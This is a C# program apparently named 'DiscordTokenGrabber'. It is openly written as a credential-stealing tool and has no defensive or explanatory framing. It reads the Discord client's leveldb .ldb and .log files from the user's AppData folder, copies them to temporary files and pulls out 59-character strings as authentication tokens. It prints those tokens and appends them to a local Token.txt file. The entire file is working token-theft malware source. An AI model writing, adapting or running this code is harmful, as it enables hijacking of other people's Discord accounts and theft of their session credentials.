using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;

namespace DiscordTokenGrabber
{
    
    public class Program
    {
        
        public static void Main()
        {
            new DiscordToken();
            Console.ReadLine();
        }
    }
    public class DiscordToken
    {
        public Random rnd = new Random();
        public DiscordToken()
        {
            GetToken();
        }
        public void GetToken()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                Console.WriteLine("Didn't find any files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        Console.WriteLine($"Token={match.ToString()}");
                        using (StreamWriter sw = new StreamWriter("Token.txt", true))
                        {
                            sw.WriteLine($"Token={match.ToString()}");
                        }
                    }
                }
            }
        }
        private List<string> SearchForFile()
        {
            List<string> discFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                Console.WriteLine("Discord path not found");
                return discFiles;
            }


            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string random = rnd.Next(0, 8345).ToString();
                FileStream inf = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                FileStream outf = new FileStream(random, FileMode.Create);
                int a;
                while ((a = inf.ReadByte()) != -1)
                {
                    outf.WriteByte((byte)a);
                }
                inf.Close();
                inf.Dispose();
                outf.Close();
                outf.Dispose();
                string rawText = File.ReadAllText(random);
                if (rawText.Contains("oken"))
                {
                    Console.WriteLine($"{Path.GetFileName(file)} added");
                    discFiles.Add(rawText);
                    File.Delete(random);
                }
            }
            foreach (string file in Directory.GetFiles(discordPath, "*.log", SearchOption.TopDirectoryOnly))
            {
                string random = rnd.Next(0, 8345).ToString();
                FileStream inf = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                FileStream outf = new FileStream(random, FileMode.Create);
                int a;
                while ((a = inf.ReadByte()) != -1)
                {
                    outf.WriteByte((byte)a);
                }
                inf.Close();
                inf.Dispose();
                outf.Close();
                outf.Dispose();
                string rawText = File.ReadAllText(random);
                if (rawText.Contains("oken"))
                {
                    Console.WriteLine($"{Path.GetFileName(file)} added");
                    discFiles.Add(rawText);
                    File.Delete(random);
                }
            }
            return discFiles;
        }

        
    }
}
